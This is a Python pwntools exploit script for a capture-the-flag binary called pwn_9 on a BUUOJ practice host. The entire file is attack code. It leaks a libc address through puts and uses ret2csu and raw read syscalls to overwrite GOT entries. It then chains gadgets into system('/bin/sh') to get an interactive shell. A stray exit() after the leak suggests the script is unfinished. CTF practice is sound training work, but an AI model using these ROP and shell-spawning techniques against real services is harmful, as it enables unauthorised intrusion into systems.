#!python
#coding:utf-8

from pwn import *
import subprocess, sys, os
from time import sleep

arg = lambda x, y: args[y] if args[y] else x
FILE = arg('./pwn_9', 'FILE')
IP = arg('node4.buuoj.cn', 'IP')
PORT = arg(25842, 'PORT')
LIBC = arg('/lib/x86_64-linux-gnu/libc.so.6', 'LIBC')
RLIBC = arg(LIBC, 'RLIBC')

sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive() if p.connected() else p.close()
dbg = lambda cmd='': gdb.attach(p, cmd)and pause(2)if args['DBG']else False
uu64 = lambda x: u64(x.ljust(8, b'\0'))
leak = lambda value, info=b'': success('%s ==> 0x%x'%(info, value))
one_gadget = lambda filename=LIBC: list(map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split()))
def run(ip=IP, port=PORT):global p;p=remote(ip,port)if args['REMOTE'] else process(FILE)
def loadlibc(filename=RLIBC if args['REMOTE'] else LIBC):global libc;libc=ELF(filename,checksec=False)
def str2int(s, info = '',offset = 0):s=p.recv(s)if type(s)==int else s;ret=uu64(s)-offset;leak(ret,info);return ret

context(os='linux', arch='amd64')
context.terminal = 'wt.exe -w pwn nt bash -c'.split()
context.log_level = 'DEBUG'

def chose(idx):
    sla(b'Chose', str(idx).encode())
def add(idx, size, content=b'\n'):
    chose(1)
    sla(b'Index', str(idx).encode())
    sla(b'Size', str(size).encode())
    sa(b'Content', content)
def free(idx):
    chose(2)
    sla(b'Index', str(idx).encode())
def edit(idx, content):
    chose(3)
    sla(b'Index', str(idx).encode())
    sa(b'Content', content)
def show(idx):
    chose(4)
    sla(b'Index', str(idx).encode())
def ret2csu(func, edi, rsi, rdx, last=0):
    __libc_csu_init = 0x401460
    __libc_csu_fini = 0x40147A
    payload  = p64(__libc_csu_fini)
    # payload += b'a'*8
    payload += flat(0, 1, edi, rsi, rdx, func, __libc_csu_init)
    # payload += b'a' * 56
    # payload += p64(last)
    return payload
def my_pause(n=0):
    p.recvuntil(b'winmt wants a girlfriend...\n')

run()
e = ELF(FILE, checksec=False)
# rop = ROP(e)
# rop.call(e.plt['puts'], [e.got['puts']])
# payload  = rop.chain()
# payload  = ret2csu(e.got['read'], 0, e.bss()+0x800, 0x100, 0)
rdi = 0x0000000000401483 #  pop rdi; ret;
rsi = 0x0000000000401481 #  pop rsi; pop r15; ret;
payload  = flat(e.bss()+0x800, rdi, e.got['puts'], e.plt['puts'], repeatread:=0x4013AE)
payload  = payload.ljust(0x40, b'\0') + b'\x30'
# dbg('b *0x4013C4')
p.recvuntil(b'\x1B[5m\x1B[31mwinmt has a dream ! ! !\x1B[0m\n')
my_pause(1)
p.send(payload)
loadlibc()

print(hex(u64(p.recv(6).ljust(8, b'\0'))))
exit()
libc.address = str2int(6, 'libc', libc.sym['puts'])
assert libc.address & 0xfff == 0
dbg('b *0x401391')
payload  = ret2csu(e.got['read'], 0, e.bss()+0x800+0x38, 0x8*25).ljust(0x40)
payload += flat(e.bss()+0x800-0x40-8, lr:=0x401415)
my_pause(1)
p.send(payload)
rdi = libc.address + 0x000000000002a3e5
rsi = libc.address + 0x000000000002be51
rdx = libc.address + 0x000000000011f497
rax = libc.address + 0x0000000000045eb0
target = libc.address - 0x7ffff7d64000 + 0x7ffff7d5fe58 + 0x3000
success(hex(target))
syscall = libc.address + 0x0000000000091396 # 0f 05 c3
payload  = flat(rdi, 0, rsi, target, rdx, 0x8*4, 0, rax, 0, syscall)
payload += flat(rdi, 0, rsi, e.got['sleep'], rdx, 0x8, 0, rax, 0, syscall)
payload += flat(rdi, 1000000000, libc.sym['sleep'])
my_pause(1)
p.send(payload)
payload  = flat(rdi+1, rdi, next(libc.search(b'/bin/sh\0')), libc.sym['system'])
my_pause(1)
p.send(payload)
my_pause(1)
p.send(p64(lr))
ia()
